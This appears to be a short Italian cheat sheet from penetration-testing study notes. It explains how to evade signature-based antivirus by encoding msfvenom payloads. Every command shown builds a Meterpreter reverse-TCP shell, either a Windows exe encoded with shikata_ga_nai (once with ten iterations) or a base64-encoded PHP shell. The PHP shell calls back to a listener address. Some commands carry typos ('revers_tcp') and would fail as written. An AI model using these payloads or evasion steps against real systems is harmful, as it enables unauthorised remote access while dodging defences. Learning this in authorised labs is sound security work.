Ovviamente essendo il payload trasferito e caricato all’interno di un macchina le possibilità che un AV lo rilevi sono molte. Gli AV ci rilevano tramite firme digitali.  Possiamo eludere le vecchie soluzioni AV basate sulle firme codificando i nostri payload.

- **msfvenom --list encoders** visualizza tutti i formati con cui codificare il payload

Encoders da utilizzare:

- **-e FORMATO/shikata_ga_nai**
    - `msfvenom -p windows/x86/meterpreter/revers_tcp LHOST=X.X.X.X LPORT=XXXX -e x86/shikata_ga_nai -f exe > shell.exe`
- **-e FORMATO/base64**
    - `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64 -f raw > shell.php`

E’ consigliato usare **shikata_ga_nai** come encodere

Aumentare **interazione** per eludere gli AV con shikata_ga_nai

- `msfvenom -p windows/x86/meterpreter/revers_tcp LHOST=X.X.X.X LPORT=XXXX -i 10 -e x86/shikata_ga_nai -f exe > shell.exe`
    - **-i 10** 10 interazioni, 10 è il valore consigliato, oltre non cambia l’output
